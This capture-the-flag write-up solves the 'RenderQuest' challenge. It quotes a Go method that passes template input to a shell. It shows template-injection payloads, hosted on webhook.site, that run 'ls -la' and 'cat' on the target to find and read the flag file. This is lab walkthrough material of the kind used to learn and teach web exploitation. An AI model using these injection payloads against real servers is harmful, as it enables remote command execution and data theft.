# RenderQuest (Webhooks | SSTI)

find main.go in challenge folder with files provided for the challenge

main.go

```jsx
func (p RequestData) FetchServerInfo(command string) string {
	out, err := exec.Command("sh", "-c", command).Output()
	if err != nil {
		return ""
	}
	return string(out)
```

function for executing a command:

```jsx
exec.Command("sh", "-c", command)
```

[https://webhook.site](https://webhook.site/#!/010b4caf-8d2b-4a73-b677-d5424f27af77/43e500a2-38e9-44df-a8f7-a76a5e067ac8/1)

edit URL:

display payload response as plaintext

{{}} indicates code execution 

use information from main.go function for requesting server info

use “ls -la” to check if injection works

```jsx
{{.FetchServerInfo "ls -la"}}
```

![Untitled](RenderQuest%20(Webhooks%20SSTI)%2001cf82eb4d0b4a2ead64b8dcc77e9bcc/Untitled.png)

copy URL on webhooks and paste into ‘Enter the link to your template’ section on webpage

![Untitled](RenderQuest%20(Webhooks%20SSTI)%2001cf82eb4d0b4a2ead64b8dcc77e9bcc/Untitled%201.png)

press render now

displays the response

![Untitled](RenderQuest%20(Webhooks%20SSTI)%2001cf82eb4d0b4a2ead64b8dcc77e9bcc/Untitled%202.png)

can now view the contents of the current directory

now try different payloads

```jsx
{{.FetchServerInfo "cd ..; ls -la"}}
```

![Untitled](RenderQuest%20(Webhooks%20SSTI)%2001cf82eb4d0b4a2ead64b8dcc77e9bcc/Untitled%203.png)

goes back in directory to search

see flag.txt

![Untitled](RenderQuest%20(Webhooks%20SSTI)%2001cf82eb4d0b4a2ead64b8dcc77e9bcc/Untitled%204.png)

now know name and directory location of flag

```jsx
flaga8eed19a16.txt
```

use cat to read contents of flag.txt

```python
{{.FetchServerInfo "cd ..;cat flaga8eed19a16.txt"}}
```

![Untitled](RenderQuest%20(Webhooks%20SSTI)%2001cf82eb4d0b4a2ead64b8dcc77e9bcc/Untitled%205.png)

save URL

resend the webhook URL on the webpage 

gives flag to submit